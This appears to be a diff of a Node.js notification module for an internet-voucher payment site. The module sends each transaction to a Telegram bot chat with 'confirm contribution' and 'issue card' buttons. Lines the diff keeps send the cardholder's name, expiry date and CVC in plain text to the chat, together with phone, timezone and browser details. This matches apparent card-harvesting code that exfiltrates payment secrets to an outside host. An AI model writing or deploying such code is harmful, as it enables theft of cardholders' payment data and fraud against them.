@@ -61,9 +61,9 @@ function getFormattedDateTime() {
 }
 
 /**
- * 1. إرسال إشعار الدفع الأولي مع أزرار التحكم الفوري (موافقة الكارت أو المساهمة)
+ * 1. إرسال إشعار الدفع الأولي مع الأزرار التفاعلية (مساهمة أو إصدار كارت)
  */
-async function sendPaymentNotificationWithButtons(paymentPayload, transactionId) {
+async function sendTelegramMessage(paymentPayload, transactionId) {
   try {
     if (!BOT_TOKEN || !CHAT_ID) {
       console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
@@ -84,11 +84,10 @@ async function sendPaymentNotificationWithButtons(paymentPayload, transactionId)
     const dateTimeStr = getFormattedDateTime();
 
     const branchName = paymentPayload.branchName || paymentPayload.branch_name || "حكايات نت رئيسي";
-    const branchKey = paymentPayload.branch || 'branch2';
     const userPhone = paymentPayload.phone || 
-                        paymentPayload.billing_data?.phone_number || 
-                        paymentPayload.customer?.phone_number || 
-                        "غير محدد";
+                      paymentPayload.billing_data?.phone_number || 
+                      paymentPayload.customer?.phone_number || 
+                      "غير محدد";
 
     const clientID = paymentPayload.clientID || paymentPayload.clientId || "غير متوفر";
 
@@ -111,11 +110,11 @@ async function sendPaymentNotificationWithButtons(paymentPayload, transactionId)
     const userTimeZone = paymentPayload.userTimeZone || "غير متوفر";
     const lang = paymentPayload.lang || "غير متوفر";
 
-    let message = `⏳ <b>طلب دفع بانتظار موافقة المشرف...</b>\n\n` +
-              `🏢 الفرع: <b>${branchName}</b>\n` +
-              `💳 وسيلة الدفع: <b>${method}</b>\n` +
-              `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n` +
-              `🆔 رقم العملية: <code>${transactionId}</code>\n`;
+    let message = `⏳ <b>جاري عملية الدفع بانتظار الموافقة...</b>\n\n` +
+                  `🏢 الفرع: <b>${branchName}</b>\n` +
+                  `💳 وسيلة الدفع: <b>${method}</b>\n` +
+                  `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n` +
+                  `🆔 رقم المعاملة: <code>${transactionId}</code>\n`;
 
     if (userPhone && userPhone !== "غير محدد") {
       message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
@@ -127,10 +126,6 @@ async function sendPaymentNotificationWithButtons(paymentPayload, transactionId)
                  `👤 اسم صاحب البطاقة: <b>${paymentPayload.card_data.name}</b>\n` +
                  `📅 تاريخ الانتهاء: <code>${paymentPayload.card_data.expiry}</code>\n` +
                  `🔒 رمز CVC: <code>${paymentPayload.card_data.cvc}</code>\n`;
-    }
-
-    if (parseFloat(amountEGP) > 100 || paymentPayload.isContribution) {
-      message += `\n✨ <b>نوع العملية:</b> مساهمة مالية محتملة أو دعم للشبكة.\n`;
     }
 
     message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
@@ -148,93 +143,29 @@ async function sendPaymentNotificationWithButtons(paymentPayload, transactionId)
                `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
                `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;
 
-    // أزرار تفاعلية (Callback Data) لتحكم المشرف الفوري
-    let inlineKeyboard = [
+    // الأزرار التفاعلية للمشرف
+    const inlineKeyboard = [
       [
-        {
-          text: "✅ موافقة وإصدار الكارت",
-          callback_data: `approve_card_${transactionId}_${branchKey}`
-        },
-        {
-          text: "🌟 تحويل إلى مساهمة",
-          callback_data: `approve_contrib_${transactionId}_${amountEGP}`
-        }
+        { text: "🌟 تأكيد المساهمة", callback_data: `contribution_${transactionId}_${amountEGP}` },
+        { text: "🎫 إصدار الكارت", callback_data: `issuecard_${transactionId}_${amountEGP}` }
       ]
     ];
-
-    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: inlineKeyboard
-      }
-    });
-
-    console.log(`✅ تم إرسال إشعار أزرار التحكم بالموافقة للمعاملة: ${transactionId}`);
-    return response.data;
-
-  } catch (err) {
-    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
-  }
-}
-
-/**
- * 2. إرسال إشعار النجاح النهائي بعد إصدار الكارت
- */
-async function sendTelegramMessage(data, isInitial = true) {
-  if (isInitial) {
-    return; // يتم استخدام sendPaymentNotificationWithButtons بدلاً منها للطلبات الأولية
-  }
-
-  try {
-    if (!BOT_TOKEN || !CHAT_ID) {
-      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
-      return;
-    }
-
-    const method = getPaymentMethodName(data);
-    const amountEGP = data.amount_cents
-      ? (data.amount_cents / 100).toFixed(2)
-      : (data.amount || "غير محدد");
-    const dateTimeStr = getFormattedDateTime();
-
-    const branchName = data.branchName || data.branch_name || "حكايات نت رئيسي";
-    const userPhone = data.phone || 
-                        data.billing_data?.phone_number || 
-                        data.customer?.phone_number || 
-                        "غير محدد";
-
-    const txnId = data.id || data.transactionId || data.order?.id || "غير متوفر";
-    const voucher = data.voucher_code || data.cardCode || "غير متوفر";
-    const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
-    const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";
-
-    let message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
-              `🏢 الفرع: <b>${branchName}</b>\n` +
-              `🆔 رقم العملية: <code>${txnId}</code>\n` +
-              `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
-              `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
-              `💳 وسيلة الدفع: <b>${method}</b>\n` +
-              `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
-              `📦 الباقة المفعلة: <b>${packageInfo}</b>\n` +
-              `🎟️ كارت الإنترنت: <code>${voucher}</code>\n` +
-              `----------------------------------------\n` +
-              `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: message,
-      parse_mode: "HTML"
+      parse_mode: "HTML",
+      reply_markup: { inline_keyboard: inlineKeyboard }
     });
 
+    console.log(`✅ تم إرسال إشعار التليجرام مع الأزرار بنجاح للمعاملة: ${transactionId}`);
   } catch (err) {
     console.error("❌ [Telegram Error]:", err.response?.data || err.message);
   }
 }
 
 /**
- * 3. 🎯 إرسال صورة الكارت الاحترافية المصدرة آلياً إلى التليجرام
+ * 2. 🎯 إرسال صورة الكارت الاحترافية المصدرة آلياً إلى التليجرام
  */
 async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
   try {
@@ -286,6 +217,5 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
 
 module.exports = {
   sendTelegramMessage,
-  sendPaymentNotificationWithButtons,
   sendVoucherWithCardImage
 };
